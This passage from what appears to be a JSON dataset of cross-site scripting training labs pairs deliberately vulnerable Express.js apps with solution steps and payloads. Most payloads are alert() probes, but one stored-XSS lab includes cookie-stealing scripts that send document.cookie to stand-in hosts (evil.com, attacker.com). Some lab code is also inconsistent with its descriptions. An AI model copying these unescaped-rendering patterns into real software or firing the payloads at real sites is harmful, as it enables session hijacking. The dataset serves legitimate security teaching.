      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/breadcrumb', (req, res) => {\n  const label = req.query.label || 'Home';\n  res.send(`<html><body><nav>${label} / Dashboard</nav></body></html>`);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via survey builder preview text",
      "Lab Description": "The app allows users to build surveys with custom questions and preview them. The question text is rendered using innerHTML, allowing an attacker to inject script in a question label.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Add a question with text like <script>alert(1)</script>",
        "Go to the survey preview page",
        "Observe script execution when question is rendered"
      ],
      "payloads": [
        "<script>alert('surveyXSS')</script>",
        "<img src=x onerror=alert('survey')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet questions = [];\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/add-question', (req, res) => {\n  questions.push(req.body.q);\n  res.redirect('/preview');\n});\n\napp.get('/preview', (req, res) => {\n  const html = questions.map(q => `<div>${q}</div>`).join('');\n  res.send(`<html><body>${html}</body></html>`);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via system log viewer with user input reflection",
      "Lab Description": "The log viewer displays server logs that include some user input (e.g., usernames, actions). If the log output is rendered using innerHTML without sanitization, attackers can inject malicious HTML into logs.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Trigger an action that logs your name as <script>alert(1)</script>",
        "Access the admin log viewer",
        "Payload executes when the log entry is rendered"
      ],
      "payloads": [
        "<script>alert('logXSS')</script>",
        "<img src=x onerror=alert('log')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet logs = [];\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/action', (req, res) => {\n  logs.push(`User ${req.body.user} performed an action.`);\n  res.redirect('/logs');\n});\n\napp.get('/logs', (req, res) => {\n  const html = logs.map(l => `<div>${l}</div>`).join('');\n  res.send(`<html><body>${html}</body></html>`);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via photo album tag cloud rendering",
      "Lab Description": "The app generates a tag cloud based on user-defined tags for images. The tags are inserted directly into the DOM using innerHTML, leading to XSS when a tag contains executable HTML.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Create a tag like <img src=x onerror=alert(1)>",
        "Visit the photo album page",
        "Observe execution when the tag is displayed in the cloud"
      ],
      "payloads": [
        "<img src=x onerror=alert('tagCloudXSS')>",
        "<svg/onload=alert('tag')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet tags = [];\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/add-tag', (req, res) => {\n  tags.push(req.body.tag);\n  res.redirect('/cloud');\n});\n\napp.get('/cloud', (req, res) => {\n  const html = tags.map(t => `<span>${t}</span>`).join(' ');\n  res.send(`<html><body>${html}</body></html>`);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via dynamic status badge on profile",
      "Lab Description": "Users can set a custom status on their profile. This value is displayed as a badge using innerHTML. If the input is not sanitized, it enables arbitrary HTML injection.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Set your status to <script>alert(1)</script>",
        "Visit your own or someone else's view of your profile",
        "Script executes as the badge is rendered"
      ],
      "payloads": [
        "<script>alert('statusXSS')</script>",
        "<img src=x onerror=alert('status')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet status = '';\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/set-status', (req, res) => {\n  status = req.body.status;\n  res.redirect('/profile');\n});\n\napp.get('/profile', (req, res) => {\n  res.send(`<html><body><div class='badge'>${status}</div></body></html>`);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via live preview of social media post",
      "Lab Description": "The app allows users to draft social media posts and preview them before publishing. The preview panel renders the post using innerHTML. If the input contains HTML or scripts, it executes in the preview pane.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Draft a post with content: <img src=x onerror=alert(1)>",
        "Click 'Preview Post'",
        "Observe payload executing in the live preview"
      ],
      "payloads": [
        "<script>alert('previewXSS')</script>",
        "<img src=x onerror=alert('livePreview')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet post = '';\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/draft', (req, res) => {\n  post = req.body.content;\n  res.redirect('/preview');\n});\n\napp.get('/preview', (req, res) => {\n  res.send(`<html><body><div id='preview'>${post}</div></body></html>`);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via status message in real-time activity feed",
      "Lab Description": "User status updates are broadcast to a real-time feed using WebSocket. Messages are injected into the feed container via innerHTML. A crafted message can include HTML that executes instantly.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Send a WebSocket message containing <script>alert(1)</script>",
        "Message is injected into other users’ feeds",
        "Observe payload execution across clients"
      ],
      "payloads": [
        "<script>alert('feedXSS')</script>",
        "<img src=x onerror=alert('activity')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst http = require('http');\nconst WebSocket = require('ws');\n\nconst app = express();\nconst server = http.createServer(app);\nconst wss = new WebSocket.Server({ server });\n\nwss.on('connection', socket => {\n  socket.on('message', msg => {\n    wss.clients.forEach(client => {\n      if (client.readyState === WebSocket.OPEN) {\n        client.send(msg);\n      }\n    });\n  });\n});\n\napp.get('/feed', (req, res) => {\n  res.send(`\n    <html>\n      <body>\n        <ul id='feed'></ul>\n        <script>\n          const ws = new WebSocket('ws://' + location.host);\n          ws.onmessage = e => {\n            document.getElementById('feed').innerHTML += '<li>' + e.data + '</li>';\n          };\n        </script>\n      </body>\n    </html>`);\n});\n\nserver.listen(3000);"
    },
    {
      "Lab scenario": "XSS via theme color name in CSS injection",
      "Lab Description": "Users can define theme settings including color names. These names are injected into a `<style>` tag for live theming. Malicious names can break out of CSS and inject HTML or JS.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Set theme color name to: red;}<script>alert(1)</script>{",
        "App injects value into CSS rules inside `<style>` tag",
        "Script is parsed and executed"
      ],
      "payloads": [
        "red;}<script>alert('themeXSS')</script>{",
        "blue;}<img src=x onerror=alert('theme')>{"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet themeColor = '';\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/set-theme', (req, res) => {\n  themeColor = req.body.color;\n  res.redirect('/themed');\n});\n\napp.get('/themed', (req, res) => {\n  res.send(`\n    <html>\n      <head><style>.btn { background: ${themeColor}; }</style></head>\n      <body><button class='btn'>Click</button></body>\n    </html>`);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via forum quote reply injection",
      "Lab Description": "In the forum, replying to a post quotes the original message. The quote content is copied and rendered with innerHTML. If the original contains a payload, the reply will include executable code.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Create a forum post with <script>alert(1)</script>",
        "Click 'Reply with Quote'",
        "Observe payload execution in reply editor or preview"
      ],
      "payloads": [
        "<script>alert('quoteXSS')</script>",
        "<img src=x onerror=alert('quote')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet messages = [];\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/post', (req, res) => {\n  messages.push(req.body.msg);\n  res.redirect('/forum');\n});\n\napp.get('/forum', (req, res) => {\n  const html = messages.map(m => `<div>${m}</div><button onclick=\"document.getElementById('reply').innerHTML='${m}'\">Reply with Quote</button>`).join('<hr>');\n  res.send(`<html><body>${html}<div id='reply'></div></body></html>`);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via embedded widget parameter injection",
      "Lab Description": "The platform supports embedding widgets via iframe or script snippet. The widget accepts parameters via query string. If these values are reflected in the widget HTML, XSS can occur.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Construct iframe src with query: ?label=<script>alert(1)</script>",
        "Embed widget on external page",
        "Observe payload executing inside embedded context"
      ],
      "payloads": [
        "<script>alert('widgetXSS')</script>",
        "<img src=x onerror=alert('widget')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/widget', (req, res) => {\n  const label = req.query.label || 'Default';\n  res.send(`<html><body><div>${label}</div></body></html>`);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via notification sound name in audio tag",
      "Lab Description": "The app allows users to customize their notification sound by selecting a named sound file. The selected name is inserted into an `<audio>` tag’s `src` attribute using innerHTML. A malicious name can break out of the attribute and inject script.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Submit a sound name like x onerror=alert(1)//",
        "App renders: <audio src='x onerror=alert(1)//'>",
        "Script executes when audio tag is parsed"
      ],
      "payloads": [
        "x onerror=alert('audioXSS')//",
        "'><script>alert('sound')</script>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet sound = '';\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/set-sound', (req, res) => {\n  sound = req.body.name;\n  res.redirect('/notification');\n});\n\napp.get('/notification', (req, res) => {\n  res.send(`<html><body><audio src='${sound}' autoplay></audio></body></html>`);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via tooltip for user reaction emoji",
      "Lab Description": "The app shows emoji reactions with user tooltips. When hovering over a reaction, a tooltip displays the user’s name. If names are rendered using innerHTML, XSS can be triggered via a malicious username.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Set username to <img src=x onerror=alert(1)>",
        "React to a post",
        "Hover over your emoji and observe payload in tooltip"
      ],
      "payloads": [
        "<img src=x onerror=alert('emojiTooltip')>",
        "<svg/onload=alert('emoji')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet reactions = [];\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/react', (req, res) => {\n  reactions.push(req.body.username);\n  res.redirect('/post');\n});\n\napp.get('/post', (req, res) => {\n  const html = reactions.map(u => `<span title='${u}'>👍</span>`).join('');\n  res.send(`<html><body>${html}</body></html>`);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via email signature HTML rendering",
      "Lab Description": "The app allows users to set a custom email signature. The signature is rendered as-is in the compose window using innerHTML. A malicious payload in the signature leads to XSS.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Set your signature to <script>alert(1)</script>",
        "Open the email compose window",
        "Script executes when signature loads"
      ],
      "payloads": [
        "<script>alert('signatureXSS')</script>",
        "<img src=x onerror=alert('sig')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet signature = '';\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/set-signature', (req, res) => {\n  signature = req.body.sig;\n  res.redirect('/compose');\n});\n\napp.get('/compose', (req, res) => {\n  res.send(`<html><body><div id='editor'>${signature}</div></body></html>`);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via rich text editor auto-save preview",
      "Lab Description": "The app auto-saves drafts from a rich text editor and previews the last saved content using innerHTML. If an attacker injects a payload, it executes when the preview is shown.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Type <img src=x onerror=alert(1)> in editor",
        "Trigger auto-save",
        "Visit draft preview page to see execution"
      ],
      "payloads": [
        "<img src=x onerror=alert('autosaveXSS')>",
        "<script>alert('draft')</script>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet draft = '';\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/autosave', (req, res) => {\n  draft = req.body.content;\n  res.send('Saved');\n});\n\napp.get('/preview-draft', (req, res) => {\n  res.send(`<html><body><div>${draft}</div></body></html>`);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via failed login error message",
      "Lab Description": "The login page displays an error message when authentication fails. If the username is reflected in the error using innerHTML, an attacker can inject a payload to be executed after failed login.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Submit login with username <script>alert(1)</script>",
        "Password can be anything",
        "Error message reflects the username and triggers XSS"
      ],
      "payloads": [
        "<script>alert('loginXSS')</script>",
        "<img src=x onerror=alert('login')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/login', (req, res) => {\n  const name = req.body.username;\n  res.send(`<html><body><p>Login failed for user: ${name}</p></body></html>`);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via feedback form confirmation message",
      "Lab Description": "The feedback form displays a confirmation message after submission that includes the user’s name. The name is rendered using innerHTML without sanitization, allowing XSS via crafted input.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Submit feedback with name: <img src=x onerror=alert(1)>",
        "Wait for confirmation message",
        "Payload executes in the success dialog"
      ],
      "payloads": [
        "<script>alert('feedbackXSS')</script>",
        "<img src=x onerror=alert('confirm')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/feedback', (req, res) => {\n  const name = req.body.name;\n  res.send(`<html><body><p>Thanks for your feedback, ${name}!</p></body></html>`);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via custom label in dynamic progress bar",
      "Lab Description": "The application renders progress bars with custom labels provided by users. These labels are injected into innerHTML of progress components. A malicious label leads to XSS.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Submit a label like <script>alert(1)</script>",
        "View the progress bar in dashboard",
        "Payload executes inside the bar"
      ],
      "payloads": [
        "<script>alert('progressXSS')</script>",
        "<img src=x onerror=alert('progress')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet label = '';\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/set-progress', (req, res) => {\n  label = req.body.label;\n  res.redirect('/progress');\n});\n\napp.get('/progress', (req, res) => {\n  res.send(`<html><body><div class='bar'>${label}: 70%</div></body></html>`);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via image alt-text in gallery lightbox viewer",
      "Lab Description": "The image gallery shows the `alt` text of images in a lightbox preview. If the `alt` attribute is set by the user and rendered using innerHTML, it enables XSS.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Upload an image with alt=<img src=x onerror=alert(1)>",
        "Open lightbox viewer",
        "Payload triggers inside the alt-text preview"
      ],
      "payloads": [
        "<img src=x onerror=alert('lightboxXSS')>",
        "<script>alert('altXSS')</script>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet altText = '';\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/upload-alt', (req, res) => {\n  altText = req.body.alt;\n  res.redirect('/viewer');\n});\n\napp.get('/viewer', (req, res) => {\n  res.send(`<html><body><img src='img.jpg' alt='${altText}'><p>${altText}</p></body></html>`);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via URL shortening preview page",
      "Lab Description": "The app generates previews for shortened URLs by displaying the destination page title. If the destination includes attacker-controlled HTML in its title, it can be injected into the preview page.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Shorten a malicious page with <title><script>alert(1)</script></title>",
        "Preview the shortened link",
        "Script executes inside preview panel"
      ],
      "payloads": [
        "<title><script>alert('shortXSS')</script></title>",
        "<title><img src=x onerror=alert(1)></title>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet title = '';\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/submit-url', (req, res) => {\n  title = req.body.title;\n  res.redirect('/preview');\n});\n\napp.get('/preview', (req, res) => {\n  res.send(`<html><body><h2>Preview:</h2><div>${title}</div></body></html>`);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via custom dashboard widget title",
      "Lab Description": "Users can add widgets to a customizable dashboard and set titles for them. These titles are rendered in cards using innerHTML. If malicious content is set as title, it leads to XSS on render.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Create a widget with title <script>alert(1)</script>",
        "View the widget on the dashboard",
        "Script executes inside the widget title"
      ],
      "payloads": [
        "<script>alert('widgetTitleXSS')</script>",
        "<img src=x onerror=alert('widget')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet widgetTitle = '';\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/add-widget', (req, res) => {\n  widgetTitle = req.body.title;\n  res.redirect('/dashboard');\n});\n\napp.get('/dashboard', (req, res) => {\n  res.send(`<html><body><div class='card'>${widgetTitle}</div></body></html>`);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via dynamic breadcrumb JSON injection in SPA routing",
      "Lab Description": "The app uses client-side JavaScript to generate breadcrumb navigation from a JSON structure passed via query parameters. The values are inserted into the DOM using innerHTML. If attackers inject script via breadcrumb labels, it results in DOM-based XSS.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Construct a query like ?crumbs=[{\"label\":\"<img src=x onerror=alert(1)>\"}]",
        "App parses and renders breadcrumb using innerHTML",
        "Script executes inside breadcrumb path"
      ],
      "payloads": [
        "[{\"label\":\"<script>alert('jsonXSS')</script>\"}]",
        "[{\"label\":\"<img src=x onerror=alert('breadcrumb')>\"}]"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\napp.get('/spa', (req, res) => {\n  const data = req.query.crumbs || '[{\"label\":\"Home\"}]';\n  res.send(`<html><body>\n    <div id='breadcrumbs'></div>\n    <script>\n      const crumbs = JSON.parse('${data}');\n      document.getElementById('breadcrumbs').innerHTML = crumbs.map(c => c.label).join(' / ');\n    </script>\n  </body></html>`);\n});\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via chart label injection in analytics dashboard",
      "Lab Description": "The dashboard allows users to label chart segments (like pie slices). Labels are rendered in the legend via innerHTML. If a label contains HTML, it gets executed when the chart renders.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Submit chart data with a label like <img src=x onerror=alert(1)>",
        "Render the chart",
        "Observe script execution in the legend"
      ],
      "payloads": [
        "<script>alert('chartXSS')</script>",
        "<img src=x onerror=alert('chart')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet labels = [];\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/chart', (req, res) => {\n  labels.push(req.body.label);\n  res.redirect('/view-chart');\n});\n\napp.get('/view-chart', (req, res) => {\n  const html = labels.map(l => `<li>${l}</li>`).join('');\n  res.send(`<html><body><ul>${html}</ul></body></html>`);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via newsletter topic selection preview",
      "Lab Description": "Users can choose newsletter topics and preview their newsletter. Topic names are displayed using innerHTML. Injected topic names result in XSS inside the preview.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Select a topic with name <script>alert(1)</script>",
        "Preview the newsletter content",
        "Observe the payload executing in preview area"
      ],
      "payloads": [
        "<script>alert('newsletterXSS')</script>",
        "<img src=x onerror=alert('newsletter')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet topic = '';\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/set-topic', (req, res) => {\n  topic = req.body.topic;\n  res.redirect('/preview-newsletter');\n});\n\napp.get('/preview-newsletter', (req, res) => {\n  res.send(`<html><body><h2>Weekly Topic:</h2><div>${topic}</div></body></html>`);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via browser tab title injection from form field",
      "Lab Description": "The site allows setting a custom browser tab title using input from a form. The title is inserted using `document.title = ...`, and if the value contains HTML with closing tags, script can escape and execute.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Submit title: </title><script>alert(1)</script>",
        "Browser injects into DOM and closes title tag early",
        "Script executes immediately"
      ],
      "payloads": [
        "</title><script>alert('tabXSS')</script>",
        "\"></title><img src=x onerror=alert(1)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet title = '';\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/set-tab-title', (req, res) => {\n  title = req.body.title;\n  res.redirect('/tab');\n});\n\napp.get('/tab', (req, res) => {\n  res.send(`<html><head><script>document.title = '${title}'</script></head><body></body></html>`);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via form autofill memory viewer",
      "Lab Description": "The app allows users to see recently submitted values for form inputs as suggestions. These values are rendered via innerHTML inside a dropdown. If user input is stored unsanitized, XSS can occur.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Submit input value: <img src=x onerror=alert(1)>",
        "Open the form again",
        "Dropdown suggestions display payload and execute it"
      ],
      "payloads": [
        "<img src=x onerror=alert('autofillXSS')>",
        "<svg/onload=alert('fill')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet memory = [];\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/save-input', (req, res) => {\n  memory.push(req.body.input);\n  res.redirect('/form');\n});\n\napp.get('/form', (req, res) => {\n  const html = memory.map(i => `<option>${i}</option>`).join('');\n  res.send(`<html><body><input list='recent'><datalist id='recent'>${html}</datalist></body></html>`);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via podcast episode title in media playlist",
      "Lab Description": "The application displays a podcast playlist with user-defined episode titles. Titles are rendered using innerHTML in a list. A malicious title can inject and execute scripts when the list is loaded.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Submit a podcast episode with title: <script>alert(1)</script>",
        "Visit the playlist page",
        "Script executes in the episode list"
      ],
      "payloads": [
        "<script>alert('podcastXSS')</script>",
        "<img src=x onerror=alert('episode')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet episodes = [];\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/add-episode', (req, res) => {\n  episodes.push(req.body.title);\n  res.redirect('/playlist');\n});\n\napp.get('/playlist', (req, res) => {\n  const html = episodes.map(e => `<li>${e}</li>`).join('');\n  res.send(`<html><body><ul>${html}</ul></body></html>`);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via custom notification banner text",
      "Lab Description": "Admins can set a global notification banner that appears on every page. The message is stored and injected into a top banner using innerHTML. Malicious content leads to stored XSS.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Submit banner text: <img src=x onerror=alert(1)>",
        "Visit any page where banner is rendered",
        "Payload executes in global UI"
      ],
      "payloads": [
        "<img src=x onerror=alert('bannerXSS')>",
        "<script>alert('notice')</script>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet banner = '';\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/set-banner', (req, res) => {\n  banner = req.body.msg;\n  res.redirect('/home');\n});\n\napp.get('/home', (req, res) => {\n  res.send(`<html><body><div class='banner'>${banner}</div></body></html>`);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via shopping cart item customization note",
      "Lab Description": "Users can leave custom notes per item in their cart. These notes are rendered inside the cart summary using innerHTML. A malicious note can trigger script execution.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Add an item with note: <script>alert(1)</script>",
        "Go to the cart summary",
        "Script executes in the note preview"
      ],
      "payloads": [
        "<script>alert('cartXSS')</script>",
        "<img src=x onerror=alert('note')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet notes = [];\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/add-note', (req, res) => {\n  notes.push(req.body.note);\n  res.redirect('/cart');\n});\n\napp.get('/cart', (req, res) => {\n  const html = notes.map(n => `<p>${n}</p>`).join('');\n  res.send(`<html><body>${html}</body></html>`);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via video player caption editor",
      "Lab Description": "Users can upload or edit captions for videos. These captions are rendered under the video using innerHTML. A caption line with HTML triggers script execution when played or displayed.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Edit a caption to: <img src=x onerror=alert(1)>",
        "Play the video or load the caption viewer",
        "Observe the XSS payload triggering in subtitle track"
      ],
      "payloads": [
        "<script>alert('captionXSS')</script>",
        "<img src=x onerror=alert('subtitles')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet captions = [];\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/add-caption', (req, res) => {\n  captions.push(req.body.line);\n  res.redirect('/player');\n});\n\napp.get('/player', (req, res) => {\n  const html = captions.map(c => `<div>${c}</div>`).join('');\n  res.send(`<html><body>${html}<video controls src='video.mp4'></video></body></html>`);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via project milestone label in timeline",
      "Lab Description": "The project management interface allows naming milestones. The names appear in a visual timeline using innerHTML. A malicious name results in DOM-based XSS when the timeline loads.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Create milestone with label: <script>alert(1)</script>",
        "Open timeline view",
        "Script executes as label renders in the chart"
      ],
      "payloads": [
        "<script>alert('timelineXSS')</script>",
        "<img src=x onerror=alert('milestone')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet milestones = [];\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/add-milestone', (req, res) => {\n  milestones.push(req.body.name);\n  res.redirect('/timeline');\n});\n\napp.get('/timeline', (req, res) => {\n  const html = milestones.map(m => `<div class='milestone'>${m}</div>`).join('');\n  res.send(`<html><body>${html}</body></html>`);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "CMS Stored XSS in blog post title rendering",
      "Lab Description": "This lab simulates a CMS where blog post titles are stored and displayed without sanitization. The application displays the post title directly in the HTML document title tag. To solve: Inject a JavaScript payload that executes when any user opens the blog post.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Use Burp Suite to intercept the blog post submission request.",
        "Verify raw HTML output to confirm reflection in <title> tag.",
        "Craft payload: <script>document.location='//evil.com?c='+document.cookie</script>",
        "Submit as blog title and publish post.",
        "Open post in a new session to trigger script."
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\nlet posts = [];\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-post', (req, res) => {\n  const title = req.body.title;\n  posts.push(title);\n  res.redirect('/posts');\n});\n\napp.get('/posts', (req, res) => {\n  const latest = posts[posts.length - 1] || 'Untitled';\n  res.send(`<!DOCTYPE html><html><head><title>${latest}</title></head><body><h1>${latest}</h1></body></html>`);\n});\n\napp.listen(3000);",
      "payloads": [
        "<script>alert('XSS')</script>",
        "<script>fetch('https://attacker.com?c='+document.cookie)</script>"
      ]
    },
    {
      "Lab scenario": "API gateway DOM-based XSS in error message handling",
      "Lab Description": "This lab simulates a DOM-based XSS vulnerability in an API gateway's debug interface. Client-side JavaScript updates error messages dynamically using `innerHTML`. To solve: Exploit an error endpoint to inject a DOM-based XSS payload.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Use Postman to submit a malformed request to /api/debug?error=<payload>.",
        "Confirm injection into error display area on UI.",
        "Craft payload: <svg onload=alert(1)> for DOM execution.",
        "Paste into API request and reload debug page.",
        "Observe code execution without backend reflection."
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\napp.get('/api/debug', (req, res) => {\n  res.send(`<!DOCTYPE html><html><body><div id='error-box'></div><script>document.getElementById('error-box').innerHTML = decodeURIComponent(location.search.split('error=')[1] || '');</script></body></html>`);\n});\napp.listen(3000);",
      "payloads": [
        "<svg onload=alert(1)>",
        "<img src=x onerror=alert(document.domain)>"
      ]
    },
    {
      "Lab scenario": "IoT dashboard Mutation-based XSS via dynamic widget rename",
      "Lab Description": "This lab mimics an IoT dashboard where widgets can be renamed inline. The application uses a mutation observer to react to DOM changes but fails to sanitize new content. To solve: Inject malicious content that gets executed when the dashboard mutates the DOM.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Inspect DOM widget element using browser dev tools.",
        "Inject: <input value='</input><script>alert(1)</script>' /> into rename field.",
        "Let the MutationObserver parse and append innerHTML.",
        "Trigger mutation by saving renamed widget.",
        "Observe payload execution."
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\napp.use(express.urlencoded({ extended: true }));\nlet widget = '';\napp.post('/rename-widget', (req, res) => {\n  widget = req.body.name;\n  res.redirect('/dashboard');\n});\napp.get('/dashboard', (req, res) => {\n  res.send(`<!DOCTYPE html><html><body><div id='widget'></div><script>const observer = new MutationObserver(() => { document.getElementById('widget').innerHTML = widget; }); observer.observe(document.body, { childList: true, subtree: true });</script></body></html>`);\n});\napp.listen(3000);",
      "payloads": [
        "<input autofocus onfocus=alert(1)>",
        "</input><script>alert('MUTATION')</script>"
      ]
    },
    {
      "Lab scenario": "Banking portal Reflected XSS in HTTP error page",
